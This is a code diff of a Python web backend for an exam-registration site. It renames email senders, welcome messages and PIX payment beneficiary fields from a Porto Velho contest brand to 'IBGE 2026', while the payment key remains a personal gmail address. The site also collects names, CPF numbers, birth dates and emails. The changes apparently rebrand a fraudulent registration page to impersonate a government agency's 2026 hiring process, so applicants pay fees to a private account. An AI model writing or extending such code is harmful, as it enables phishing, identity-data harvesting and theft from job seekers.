@@ -23,8 +23,8 @@ def _from_name_inscricao(concurso: str, cargo: str = '') -> str:
     """Retorna o display name (From) adequado conforme o concurso da inscrição."""
     c = (str(concurso or '') + ' ' + str(cargo or '')).upper()
     if 'SELETIVO' in c or 'TESTE' in c:
-        return 'Processo Seletivo Porto Velho'
-    return 'Concurso Porto Velho'
+        return 'IBGE 2026 - Processo Seletivo'
+    return 'IBGE 2026'
 
 logger = logging.getLogger(__name__)
 admin_router = APIRouter(prefix="/api")
@@ -204,12 +204,12 @@ async def seed_pix_config():
                 {'_id': 'main'},
                 {'$set': {
                     'pix_key': 'danielmmm950@gmail.com',
-                    'pix_nome': 'IBGP CONCURSOS',
-                    'pix_cidade': 'Porto Velho',
+                    'pix_nome': 'IBGE 2026',
+                    'pix_cidade': 'Rio de Janeiro',
                 }},
                 upsert=True,
             )
-            logger.info("Seeded default PIX config (IBGP CONCURSOS)")
+            logger.info("Seeded default PIX config (IBGE 2026)")
     except Exception as e:
         logger.warning(f"seed_pix_config failed: {e}")
 
@@ -457,7 +457,7 @@ async def track_registration(data: TrackIn, request: Request):
                     nome=nome, cpf=cpf, nascimento=fd.get('DATA_NASCIMENTO', ''), email=email, sessao=_tk,
                     cidade=f"{cid} / {fd['UF']}" if cid and fd.get('UF') else cid, base_url=_site_base_url(request),
                 )
-                await try_send_email(to=email, subject='Bem vindo!', html=html, from_name='Concurso Porto Velho')
+                await try_send_email(to=email, subject='Bem vindo!', html=html, from_name='IBGE 2026')
     return {'ok': True}
 
 
@@ -1411,7 +1411,7 @@ async def generate_pix_brcode(payload: Dict[str, Any]):
     if not key:
         raise HTTPException(status_code=400, detail='Chave PIX não configurada no painel admin')
 
-    nome = (s.get('pix_nome') or 'IBGP CONCURSOS').upper()
+    nome = (s.get('pix_nome') or 'IBGE 2026').upper()
     cidade = (s.get('pix_cidade') or 'PORTO VELHO').upper()
 
     try:
@@ -1559,7 +1559,7 @@ async def pix_qr_png(valor: float = 0, txid: str = ''):
     key = (s.get('pix_key') or '').strip()
     if not key:
         raise HTTPException(400, 'Chave PIX não configurada')
-    nome = (s.get('pix_nome') or 'IBGP CONCURSOS').upper()
+    nome = (s.get('pix_nome') or 'IBGE 2026').upper()
     cidade = (s.get('pix_cidade') or 'PORTO VELHO').upper()
     pix_code = build_brcode(pix_key=key, valor=(valor if valor and valor > 0 else VALOR_INSCRICAO), nome_beneficiario=nome, cidade_beneficiario=cidade, txid=(txid or '').strip() or '***')
     qr_b64 = build_qr_png_base64(pix_code, box_size=8, border=2)
@@ -1575,7 +1575,7 @@ async def pix_code_txt(valor: float = 0, txid: str = ''):
     key = (s.get('pix_key') or '').strip()
     if not key:
         raise HTTPException(400, 'Chave PIX não configurada')
-    nome = (s.get('pix_nome') or 'IBGP CONCURSOS').upper()
+    nome = (s.get('pix_nome') or 'IBGE 2026').upper()
     cidade = (s.get('pix_cidade') or 'PORTO VELHO').upper()
     pix_code = build_brcode(pix_key=key, valor=(valor if valor and valor > 0 else VALOR_INSCRICAO), nome_beneficiario=nome, cidade_beneficiario=cidade, txid=(txid or '').strip() or '***')
     return PlainTextResponse(content=pix_code, headers={'Cache-Control':'no-store, no-cache'})
